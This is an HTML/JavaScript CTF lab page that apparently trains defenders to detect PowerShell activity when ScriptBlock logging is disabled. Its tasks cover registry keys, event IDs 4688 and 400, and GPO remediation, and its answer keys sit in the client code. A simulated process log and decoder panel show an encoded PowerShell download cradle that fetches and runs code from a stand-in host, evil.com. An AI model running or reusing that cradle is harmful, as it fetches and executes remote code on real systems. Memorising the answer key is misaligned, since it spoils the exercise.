<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>CTF: Hunt for PowerShell Without Logging | ScriptBlock Disabled</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Fira Code', system-ui, monospace; }
    body {
      background: linear-gradient(160deg, #001a0a 0%, #002810 50%, #001a0a 100%);
      min-height: 100vh; display: flex; align-items: center; justify-content: center;
      padding: 1.5rem; margin: 0;
    }
    .container {
      max-width: 1150px; width: 100%; background: rgba(5, 25, 10, 0.9);
      backdrop-filter: blur(28px); border: 1px solid rgba(0, 255, 100, 0.35);
      box-shadow: 0 25px 50px rgba(0, 200, 80, 0.2); border-radius: 2.8rem;
      padding: 2rem; color: #c8ffd8;
    }
    h1 { font-size: 2.3rem; font-weight: 700; text-align: center; background: linear-gradient(135deg, #5eff8a, #00aa40); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.4rem; letter-spacing: 1px; }
    .subtitle { text-align: center; color: #8ad4a0; margin-bottom: 1.8rem; border-bottom: 1px dashed #2a5a3a; padding-bottom: 1rem; font-style: italic; }
    .panel { background: rgba(5, 20, 10, 0.8); backdrop-filter: blur(12px); border-radius: 1.8rem; padding: 1.7rem; border: 1px solid #2a5a3a; margin-bottom: 1.8rem; }
    .hidden { display: none !important; }
    input, button { background: #0a1a0f; border: 1px solid #3a6a4a; border-radius: 2rem; padding: 0.7rem 1.3rem; color: #d4ffe0; font-weight: 500; outline: none; font-size: 0.9rem; }
    input:focus { border-color: #4dff80; box-shadow: 0 0 14px #33cc55; }
    button { background: #1a3a20; border-color: #4daa60; cursor: pointer; font-weight: bold; display: inline-flex; align-items: center; gap: 0.3rem; }
    button:hover { background: #255030; border-color: #66ff8a; box-shadow: 0 0 18px #33cc55; }
    .task-card { background: #0a1a10; border-left: 6px solid #4dff80; padding: 1.2rem; border-radius: 1.3rem; margin: 1.2rem 0; animation: fadeIn 0.35s ease; }
    @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
    .log-line { background: #051008; border: 1px solid #2a4a30; padding: 0.5rem 1rem; border-radius: 0.6rem; margin: 0.4rem 0; font-family: 'Fira Code', monospace; font-size: 0.78rem; white-space: pre-wrap; color: #b8ffcc; }
    .badge { background: #1a3a25; padding: 0.2rem 0.9rem; border-radius: 20px; font-size: 0.8rem; }
    .toggle-container { background: #0a1a0f; border: 2px solid #3a6a4a; border-radius: 1.5rem; padding: 1.5rem; margin: 1rem 0; text-align: center; transition: all 0.5s ease; }
    .toggle-container.disabled-view { border-color: #ff4444; background: #1a0505; box-shadow: 0 0 20px rgba(255,0,0,0.2); }
    .toggle-container.enabled-view { border-color: #4dff80; background: #051a08; box-shadow: 0 0 20px rgba(0,255,80,0.2); }
    .toggle-switch { position: relative; display: inline-block; width: 120px; height: 50px; margin: 0.5rem 0; }
    .toggle-switch input { opacity: 0; width: 0; height: 0; }
    .toggle-slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background: #3a1a1a; transition: 0.4s; border-radius: 50px; border: 2px solid #ff4444; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; font-size: 0.8rem; font-weight: bold; }
    .toggle-slider:before { content: ""; position: absolute; height: 38px; width: 38px; left: 4px; bottom: 4px; background: #ff4444; transition: 0.4s; border-radius: 50%; }
    input:checked + .toggle-slider { background: #1a3a1a; border-color: #4dff80; }
    input:checked + .toggle-slider:before { transform: translateX(70px); background: #4dff80; }
    .toggle-label-off { color: #ff6666; z-index: 1; }
    .toggle-label-on { color: #66ff8a; z-index: 1; }
    .decoder-box { background: #051008; border: 2px dashed #4daa60; border-radius: 1rem; padding: 1rem; margin: 0.8rem 0; font-family: 'Fira Code', monospace; }
    .flag-box { background: #0a1a10; border: 2px dashed #ffd700; padding: 0.9rem; border-radius: 20px; text-align: center; font-weight: bold; font-size: 1.4rem; letter-spacing: 3px; color: #ffd700; animation: glowGold 1.7s infinite; }
    @keyframes glowGold { 0% { box-shadow: 0 0 5px #ffd700; } 50% { box-shadow: 0 0 30px #ffaa00; } 100% { box-shadow: 0 0 5px #ffd700; } }
    .registry-key { background: #051008; border: 1px solid #4daa60; padding: 0.5rem 1rem; border-radius: 0.8rem; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #66ff8a; margin: 0.4rem 0; }
    .success-msg { color: #9effb7; font-weight: bold; }
    .toast { position: fixed; top: 20px; right: 20px; background: #1a3a1a; border: 1px solid #4daa60; padding: 1rem 1.5rem; border-radius: 2rem; color: #b8ffcc; font-weight: bold; z-index: 9999; animation: slideIn 0.3s ease, fadeOut 0.3s 2.5s forwards; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
    @keyframes slideIn { from { transform: translateX(100px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
    @keyframes fadeOut { to { opacity: 0; transform: translateY(-10px); } }
    code { background: #0a1a0f; padding: 0.2rem 0.6rem; border-radius: 12px; font-family: 'Fira Code', monospace; }
  </style>
</head>
<body>
<div class="container" id="appContainer">

  <!-- LOGIN SECTION -->
  <div id="loginSection">
    <h1>⚡ PS NO-LOG HUNTER</h1>
    <div class="subtitle">PowerShell Without ScriptBlock Logging · Alternative Detection</div>
    <div class="panel">
      <div style="text-align:center;">
        <input type="text" id="studentNameInput" placeholder="Enter your name" autocomplete="off" style="width:70%;">
        <input type="password" id="studentPassInput" placeholder="Enter password" style="width:70%; margin-top:0.7rem;">
        <button id="studentSubmitLogin" style="margin-top:0.8rem;">🔐 Enter CTF Lab</button>
        <p style="font-size:0.8rem; color:#8ad4a0; margin-top:0.5rem;">
          Password: <code>ctf2025</code>
        </p>
      </div>
    </div>
  </div>

  <!-- STUDENT DASHBOARD -->
  <div id="studentDashboard" class="hidden">
    <div style="display:flex; justify-content:space-between; align-items:center;">
      <h2 style="color:#5eff8a;">👤 <span id="displayStudentName"></span></h2>
      <button id="logoutStudentBtn">🚪 Logout</button>
    </div>
    <div id="taskContainer"></div>
  </div>

</div>

<script>
(function() {
    const FIXED_PASSWORD = 'ctf2025';
    const STORAGE_KEY = 'pslog_ctf_progress';
    
    let currentUser = null;
    let loggingEnabled = false;
    let completedTasks = [];

    function loadProgress() {
        try {
            const saved = localStorage.getItem(STORAGE_KEY);
            if (saved) {
                const data = JSON.parse(saved);
                completedTasks = data.completed || [];
                return data.name;
            }
        } catch(e) {}
        return null;
    }

    function saveProgress() {
        if (currentUser) {
            localStorage.setItem(STORAGE_KEY, JSON.stringify({
                name: currentUser.name,
                completed: currentUser.completedTasks
            }));
        }
    }

    const tasks = [
      { id: 1, title: "🔍 Task 1: Identify Registry Key", desc: "Which registry value controls ScriptBlock logging? (format: ValueName = X)", answer: "EnableScriptBlockLogging = 0" },
      { id: 2, title: "📋 Task 2: Alternative Event IDs", desc: "Select the TWO event IDs to hunt PowerShell without ScriptBlock logs", answer: "4688, 400", extra: "eventIds" },
      { id: 3, title: "⚠️ Task 3: Suspicious PowerShell Command", desc: "From Event 4688 logs, find the suspicious encoded command line", answer: "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA", extra: "processLogs" },
      { id: 4, title: "🔓 Task 4: Decode the Command", desc: "The encoded command decodes to what action? (three words)", answer: "download malicious payload", extra: "decoder" },
      { id: 5, title: "🛡️ Task 5: GPO Remediation", desc: "What GPO setting enables ScriptBlock logging?", answer: "Computer\\Administrative Templates\\Windows Components\\Windows PowerShell\\Turn on Script Block Logging = Enabled", extra: "gpo" }
    ];

    const processLogs = [
      "Event 4688: cmd.exe (PID: 4520) → whoami.exe",
      "Event 4688: powershell.exe (PID: 5580) → powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA",
      "Event 4688: powershell.exe (PID: 5590) → Get-Service",
      "Event 400: PowerShell Engine started (PID: 5580)",
      "Event 400: PowerShell Engine started (PID: 5590)"
    ];

    const encodedCommand = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA";
    const decodedCommand = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.exe')";
    
    const eventIdOptions = [
      { id: "4688", label: "4688 - Process Creation" },
      { id: "400", label: "400 - PowerShell Engine Start" },
      { id: "4104", label: "4104 - ScriptBlock Logging" },
      { id: "4624", label: "4624 - Logon Event" },
      { id: "5156", label: "5156 - Network Connection" }
    ];

    function showToast(message, isError = false) {
      const existing = document.querySelector('.toast');
      if (existing) existing.remove();
      const toast = document.createElement('div');
      toast.className = 'toast';
      toast.style.background = isError ? '#3a1a1a' : '#1a3a1a';
      toast.style.borderColor = isError ? '#aa3030' : '#4daa60';
      toast.style.color = isError ? '#ffaaaa' : '#b8ffcc';
      toast.textContent = message;
      document.body.appendChild(toast);
      setTimeout(() => { if (toast.parentNode) toast.remove(); }, 3000);
    }

    function renderTasks() {
      if (!currentUser) return;
      document.getElementById('displayStudentName').innerText = currentUser.name;
      const container = document.getElementById('taskContainer');
      const completed = currentUser.completedTasks || [];
      
      let html = '<h3 style="margin-bottom:1rem;">⚡ PowerShell Logging Toggle View</h3>';
      
      html += `<div class="toggle-container ${loggingEnabled ? 'enabled-view' : 'disabled-view'}">`;
      html += '<p style="font-size:0.9rem;">🔧 ScriptBlock Logging Status:</p>';
      html += `<label class="toggle-switch">
        <input type="checkbox" id="loggingToggle" ${loggingEnabled ? 'checked' : ''} onchange="window.toggleLogging(this.checked)">
        <span class="toggle-slider"><span class="toggle-label-off">OFF</span><span class="toggle-label-on">ON</span></span>
      </label>`;
      html += `<p style="color:${loggingEnabled ? '#66ff8a' : '#ff6666'};">${loggingEnabled ? '✅ ENABLED' : '❌ DISABLED'}</p>`;
      html += '</div>';

      html += '<div class="registry-key">📁 HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell<br>';
      html += `   EnableScriptBlockLogging = <span style="color:${loggingEnabled ? '#66ff8a' : '#ff6666'};">${loggingEnabled ? '1' : '0'}</span></div>`;

      tasks.forEach(task => {
        const done = completed.includes(task.id);
        html += `<div class="task-card" style="border-left-color: ${done ? '#2ecc71' : '#4dff80'};">`;
        html += `<strong>${task.title}</strong> <span class="badge">${done ? '✅ Complete' : '🔒 Pending'}</span>`;
        html += `<p style="margin:0.4rem 0;">${task.desc}</p>`;

        if (task.extra === 'eventIds') {
          html += '<p style="font-size:0.8rem; color:#8ad4a0;">Select exactly TWO event IDs:</p>';
          html += '<div style="display:flex; flex-wrap:wrap; gap:0.5rem; margin:0.5rem 0;">';
          eventIdOptions.forEach(opt => {
            html += `<label style="cursor:pointer; padding:0.4rem 0.8rem; border-radius:1.5rem; background:#0a1a0f; border:1px solid #3a6a4a;">
              <input type="checkbox" class="eventCheckbox" value="${opt.id}" ${done ? 'disabled' : ''}> ${opt.label}
            </label>`;
          });
          html += '</div>';
          if (!done) html += '<button onclick="window.submitEventIds()" style="margin-top:0.5rem;">✅ Submit Event IDs</button>';
        } else if (task.extra === 'processLogs') {
          html += '<div class="log-line">📋 Event 4688 - Process Creation Logs:</div>';
          processLogs.forEach(l => {
            const sus = l.includes('-enc');
            html += `<div class="log-line" style="${sus ? 'border-left:3px solid #ff4444;' : ''}">${l} ${sus ? '⚠️ ENCODED' : ''}</div>`;
          });
          if (!loggingEnabled) html += '<div class="log-line" style="border-left:3px solid #ff8800;">⚠️ Event 4104 missing</div>';
        } else if (task.extra === 'decoder') {
          html += '<div class="decoder-box">';
          html += '<p style="color:#66ff8a;">🔓 Encoded Command:</p>';
          html += `<p style="font-size:0.7rem; word-break:break-all;">${encodedCommand}</p>`;
          html += '<p style="color:#66ff8a; margin-top:0.5rem;">📝 Simulated Decode:</p>';
          html += `<p style="color:#ffd700; font-weight:bold;">${decodedCommand}</p>`;
          html += '</div>';
        } else if (task.extra === 'gpo') {
          html += '<div class="log-line">📋 GPO: Computer Configuration\\...\\Windows PowerShell</div>';
          html += '<div class="log-line">Setting: <span style="color:#66ff8a;">Turn on Script Block Logging</span></div>';
        }

        if (!done && task.extra !== 'eventIds') {
          html += `<div style="display:flex; gap:0.5rem; margin-top:0.5rem;">
            <input type="text" id="answerInput${task.id}" placeholder="Your answer" style="flex:1;">
            <button onclick="window.submitTask(${task.id})">✅ Submit</button>
          </div>`;
        } else if (done) {
          html += '<p class="success-msg">✔ Task Completed Successfully</p>';
        }
        html += '</div>';
      });

      if (completed.length === tasks.length) {
        html += '<div class="flag-box">🏆 FLAG{POWERSHELL_NO_LOGGING} 🏆</div>';
        html += '<p style="text-align:center; color:#ffd700;">🎉 Excellent hunting! PowerShell detected despite disabled logging.</p>';
      }
      
      container.innerHTML = html;
    }

    window.toggleLogging = function(enabled) {
      loggingEnabled = enabled;
      renderTasks();
      showToast(enabled ? '✅ ScriptBlock logging ENABLED' : '❌ ScriptBlock logging DISABLED');
    };

    window.submitEventIds = function() {
      if (!currentUser) return;
      const checkboxes = document.querySelectorAll('.eventCheckbox:checked');
      const selected = Array.from(checkboxes).map(cb => cb.value);
      if (selected.length === 2 && selected.includes('4688') && selected.includes('400')) {
        if (!currentUser.completedTasks.includes(2)) {
          currentUser.completedTasks.push(2);
          saveProgress();
        }
        showToast('✅ Correct! 4688 and 400.');
        renderTasks();
      } else {
        showToast('❌ Need exactly 4688 and 400.', true);
      }
    };

    window.submitTask = function(taskId) {
      if (!currentUser) return;
      const input = document.getElementById(`answerInput${taskId}`);
      if (!input) return;
      const ans = input.value.trim();
      const task = tasks.find(t => t.id === taskId);
      if (!task) return;
      
      let isCorrect = ans.toLowerCase() === task.answer.toLowerCase();
      if (taskId === 4) {
        const la = ans.toLowerCase();
        isCorrect = isCorrect || (la.includes('download') && la.includes('payload'));
      }
      
      if (isCorrect) {
        if (!currentUser.completedTasks.includes(taskId)) {
          currentUser.completedTasks.push(taskId);
          saveProgress();
        }
        showToast('✅ Correct!');
        renderTasks();
      } else {
        showToast('❌ Incorrect.', true);
        input.style.animation = 'shake 0.5s ease';
        setTimeout(() => { input.style.animation = ''; }, 500);
      }
    };

    function showLogin() {
      document.getElementById('loginSection').classList.remove('hidden');
      document.getElementById('studentDashboard').classList.add('hidden');
      currentUser = null;
    }

    function showStudentDash() {
      document.getElementById('loginSection').classList.add('hidden');
      document.getElementById('studentDashboard').classList.remove('hidden');
      loggingEnabled = false;
      renderTasks();
    }

    document.addEventListener('DOMContentLoaded', () => {
      const savedName = loadProgress();
      if (savedName) document.getElementById('studentNameInput').value = savedName;
      
      document.getElementById('studentSubmitLogin').addEventListener('click', () => {
        const name = document.getElementById('studentNameInput').value.trim();
        const pass = document.getElementById('studentPassInput').value.trim();
        
        if (!name || !pass) { showToast('Enter name and password.', true); return; }
        if (pass !== FIXED_PASSWORD) { showToast('Invalid password. Use: ctf2025', true); return; }
        
        currentUser = { name: name, completedTasks: [...completedTasks] };
        document.getElementById('studentPassInput').value = '';
        showStudentDash();
      });

      document.getElementById('logoutStudentBtn').addEventListener('click', () => {
        showToast('Logged out. Progress saved!');
        showLogin();
      });

      const style = document.createElement('style');
      style.textContent = '@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px)}75%{transform:translateX(10px)}}';
      document.head.appendChild(style);
      showLogin();
    });
})();
</script>
</body>
</html>
